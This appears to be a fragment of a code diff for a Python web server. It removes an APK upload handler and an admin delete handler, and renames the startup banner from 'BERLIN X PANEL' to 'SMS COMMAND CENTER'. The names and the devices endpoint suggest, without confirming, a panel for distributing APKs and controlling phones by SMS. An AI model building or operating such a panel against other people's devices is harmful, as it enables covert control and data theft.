-        if not (path.startswith("/api/apps/") and path.endswith("/apk")):
-            return json_out(self, {"ok": False, "error": "Not found."}, 404)
-
-        try: app_id = int(path.split("/")[3])
-        except Exception: return json_out(self, {"ok": False, "error": "Invalid app id."}, 400)
-
-        try: length = int(self.headers.get("Content-Length", "0"))
-        except ValueError: length = 0
-        if length <= 0: return json_out(self, {"ok": False, "error": "Empty APK."}, 400)
-        if length > MAX_APK_BYTES: return json_out(self, {"ok": False, "error": f"APK exceeds {MAX_APK_MB} MB."}, 413)
-
-        original = safe_filename(self.headers.get("X-APK-Filename", "app.apk"))
-        if not original.lower().endswith(".apk"):
-            return json_out(self, {"ok": False, "error": "Only .apk files are accepted."}, 400)
-
-        con = get_db()
-        row = con.execute("SELECT apk_stored_name FROM apps WHERE id=?", (app_id,)).fetchone()
-        if not row:
-            con.close(); return json_out(self, {"ok": False, "error": "Registration not found."}, 404)
-
-        stored = f"{int(time.time())}-{secrets.token_hex(8)}.apk"
-        temp = APK_DIR / (".upload-" + secrets.token_hex(12))
-        digest = hashlib.sha256()
-        received = 0
-        try:
-            with temp.open("wb") as out:
-                while received < length:
-                    chunk = self.rfile.read(min(1024 * 1024, length - received))
-                    if not chunk: raise IOError("incomplete upload")
-                    received += len(chunk); digest.update(chunk); out.write(chunk)
-            temp.replace(APK_DIR / stored)
-            if row["apk_stored_name"]:
-                (APK_DIR / row["apk_stored_name"]).unlink(missing_ok=True)
-            con.execute("""
-              UPDATE apps SET apk_original_name=?, apk_stored_name=?, apk_size=?, apk_sha256=?
-              WHERE id=?
-            """, (original, stored, received, digest.hexdigest(), app_id))
-            con.commit(); con.close()
-            return json_out(self, {"ok": True, "id": app_id, "sha256": digest.hexdigest(), "size": received})
-        except Exception:
-            temp.unlink(missing_ok=True)
-            con.close()
-            return json_out(self, {"ok": False, "error": "APK upload failed."}, 500)
-
-    def do_DELETE(self):
-        path = urlparse(self.path).path
-        if not (path.startswith("/api/apps/") and path.endswith("/delete")):
-            return json_out(self, {"ok": False, "error": "Not found."}, 404)
-        if not require_admin(self): return
-        try: app_id = int(path.split("/")[3])
-        except Exception: return json_out(self, {"ok": False, "error": "Invalid id."}, 400)
-        con = get_db()
-        row = con.execute("SELECT apk_stored_name FROM apps WHERE id=?", (app_id,)).fetchone()
-        if not row:
-            con.close(); return json_out(self, {"ok": False, "error": "App not found."}, 404)
-        if row["apk_stored_name"]: (APK_DIR / row["apk_stored_name"]).unlink(missing_ok=True)
-        con.execute("DELETE FROM apps WHERE id=?", (app_id,))
-        con.commit(); con.close()
-        return json_out(self, {"ok": True})
-
 if __name__ == "__main__":
-    print(f"BERLIN X PANEL running at http://{HOST}:{PORT}")
-    print(f"Admin: http://127.0.0.1:{PORT}/admin")
-    print(f"Devices: http://127.0.0.1:{PORT}/api/devices")
+    print(f"⚡ SMS COMMAND CENTER running at http://{HOST}:{PORT}")
     ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
